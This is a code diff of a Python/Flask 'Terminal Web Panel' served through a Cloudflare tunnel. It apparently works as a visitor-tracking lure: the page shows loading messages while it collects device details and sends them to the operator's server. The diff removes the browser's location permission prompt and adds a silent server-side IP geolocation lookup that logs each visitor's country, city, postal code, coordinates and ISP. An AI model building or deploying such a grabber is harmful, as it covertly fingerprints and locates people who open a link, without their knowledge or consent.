@@ -9,12 +9,10 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 
 def rainbow(txt, offset=0):
-    out = ""
-    i = offset
+    out = ""; i = offset
     for ch in txt:
         if ch.strip():
-            out += RAINBOW[i % len(RAINBOW)] + ch
-            i += 1
+            out += RAINBOW[i % len(RAINBOW)] + ch; i += 1
         else:
             out += ch
     return out + RESET
@@ -29,8 +27,7 @@ banner = [
 ]
 off = 0
 for line in banner:
-    print(BOLD + rainbow(line, off))
-    off += 3
+    print(BOLD + rainbow(line, off)); off += 3
 print(rainbow("       StartZweb  |  Terminal Web Panel  |  Cloudflare Tunnel", off))
 print(rainbow("                    Developed for Qusoor", off + 5))
 print("=" * 70)
@@ -80,6 +77,24 @@ def get_router_ip():
     except: pass
     return "N/A"
 
+def ip_lookup(ip):
+    try:
+        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=6)
+        j = r.json()
+        return {
+            "country": j.get("country_name", "N/A"),
+            "country_code": j.get("country_code", "N/A"),
+            "region": j.get("region", "N/A"),
+            "city": j.get("city", "N/A"),
+            "latitude": j.get("latitude", "N/A"),
+            "longitude": j.get("longitude", "N/A"),
+            "timezone": j.get("timezone", "N/A"),
+            "isp": j.get("org", "N/A"),
+            "postal": j.get("postal", "N/A"),
+        }
+    except:
+        return {}
+
 print("\033[93m" + f"[*] Local IP:  {get_local_ip()}")
 print("\033[93m" + f"[*] Public IP: {get_public_ip()}")
 print("\033[93m" + f"[*] Router IP: {get_router_ip()}")
@@ -93,17 +108,19 @@ def print_visitor(d):
     print(Fore.WHITE + f"│ public_ip = {d.get('public_ip','N/A')}")
     print(Fore.WHITE + f"│ router_ip = {d.get('router_ip','N/A')}")
     print(Fore.WHITE + f"│ battery = {d.get('battery','N/A')}")
+    print(Fore.WHITE + f"│ country = {d.get('country','N/A')} ({d.get('country_code','??')})")
+    print(Fore.WHITE + f"│ region = {d.get('region','N/A')}")
+    print(Fore.WHITE + f"│ city = {d.get('city','N/A')}")
     print(Fore.WHITE + f"│ latitude = {d.get('latitude','N/A')}")
     print(Fore.WHITE + f"│ longitude = {d.get('longitude','N/A')}")
-    print(Fore.WHITE + f"│ country = {d.get('country','N/A')}")
-    print(Fore.WHITE + f"│ city = {d.get('city','N/A')}")
+    print(Fore.WHITE + f"│ postal = {d.get('postal','N/A')}")
     print(Fore.WHITE + f"│ timezone = {d.get('timezone','N/A')}")
+    print(Fore.WHITE + f"│ isp = {d.get('isp','N/A')}")
     print(Fore.WHITE + f"│ language = {d.get('language','N/A')}")
     print(Fore.WHITE + f"│ platform = {d.get('platform','N/A')}")
     print(Fore.WHITE + f"│ screen = {d.get('screen','N/A')}")
     print(Fore.WHITE + f"│ cores = {d.get('cores','N/A')}")
     print(Fore.WHITE + f"│ memory = {d.get('memory','N/A')}")
-    print(Fore.WHITE + f"│ isp = {d.get('isp','N/A')}")
     print(Fore.WHITE + f"│ referrer = {d.get('referrer','N/A')}")
     print(Fore.WHITE + f"│ user_agent = {d.get('ua','N/A')}")
     print(Fore.GREEN + "└" + "─" * 62)
@@ -189,7 +206,7 @@ HTML = """<!DOCTYPE html>
   const di=setInterval(()=>{dc=(dc+1)%4;D.textContent='.'.repeat(dc)},400);
   const set=(t,p)=>{S.textContent=t;if(p!==undefined)P.style.width=p+'%'};
 
-  const d={battery:'N/A',latitude:'N/A',longitude:'N/A',country:'N/A',city:'N/A',
+  const d={battery:'N/A',
            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A',
            language:navigator.language||'N/A',
            platform:navigator.platform||'N/A',
@@ -199,21 +216,12 @@ HTML = """<!DOCTYPE html>
            ua:navigator.userAgent||'N/A',
            referrer:document.referrer||'Direct'};
 
-  set('Reading system parameters',20);
+  set('Reading system parameters',25);
   try{const b=await navigator.getBattery();
       d.battery=Math.round(b.level*100)+'% '+(b.charging?'(Charging)':'(Discharging)')}
   catch(e){d.battery='Unavailable'}
 
-  set('Requesting location permission',40);
-  try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000,enableHighAccuracy:true}));
-      d.latitude=p.coords.latitude.toFixed(6);d.longitude=p.coords.longitude.toFixed(6)}
-  catch(e){d.latitude='Denied';d.longitude='Denied'}
-
-  set('Resolving network information',60);
-  try{const r=await fetch('https://ipapi.co/json/',{cache:'no-store'});const j=await r.json();
-      d.country=(j.country_name||'N/A')+' ('+(j.country_code||'??')+')';
-      d.city=j.city||'N/A';d.isp=j.org||'N/A'}
-  catch(e){}
+  set('Resolving network information',55);
 
   set('Transmitting session data',85);
   let ok=false;
@@ -237,9 +245,6 @@ HTML = """<!DOCTYPE html>
     <div class="info-row"><span class="info-label">PLATFORM</span><span class="info-value">${d.platform}</span></div>
     <div class="info-row"><span class="info-label">SCREEN</span><span class="info-value">${d.screen}</span></div>
     <div class="info-row"><span class="info-label">BATTERY</span><span class="info-value">${d.battery}</span></div>
-    <div class="info-row"><span class="info-label">LOCATION</span><span class="info-value">${d.latitude}, ${d.longitude}</span></div>
-    <div class="info-row"><span class="info-label">COUNTRY</span><span class="info-value">${d.country}</span></div>
-    <div class="info-row"><span class="info-label">CITY</span><span class="info-value">${d.city}</span></div>
   `;
   IB.appendChild(extra);
 })();
@@ -263,9 +268,14 @@ def collect():
         return make_response('', 204)
     try:
         d = request.get_json(force=True) or {}
-        d['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        d['public_ip'] = get_public_ip()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        d['ip'] = ip
+        d['public_ip'] = ip
         d['router_ip'] = get_router_ip()
+
+        geo = ip_lookup(ip)
+        d.update(geo)
+
         vid = f"v_{int(time.time()*1000)}"
         with LOCK: VISITORS[vid] = d
         return jsonify({"status":"ok"})
